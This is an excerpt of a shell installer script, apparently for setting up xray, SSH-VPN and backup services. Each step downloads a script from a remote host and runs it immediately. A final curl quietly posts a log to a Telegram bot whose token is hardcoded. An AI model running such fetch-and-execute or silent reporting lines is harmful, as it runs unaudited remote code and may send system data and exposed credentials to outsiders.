...
"
sleep 3
wget http://stn-cloud.my.id/xray/ins-xray.sh && chmod +x ins-xray.sh && ./ins-xray.sh
...
"
sleep 3
wget http://stn-cloud.my.id/ssh/ssh-vpn.sh && chmod +x ssh-vpn.sh && ./ssh-vpn.sh
...
"
sleep 3
wget http://stn-cloud.my.id/backup/set-br.sh && chmod +x set-br.sh && ./set-br.sh
...
"
sleep 3
wget http://stn-cloud.my.id/python/edu.sh && chmod +x edu.sh && ./edu.sh
...
"
curl -s --max-time 10 -d "chat_id=1668998643r&disable_web_page_preview=1&text=${log}&parse_mode=html" https://api.telegram.org/bot6096112347:AAG7SnkpqKtGtdYXjtDW9dAJ5zp_AqlljDE/sendMessage >/dev/null
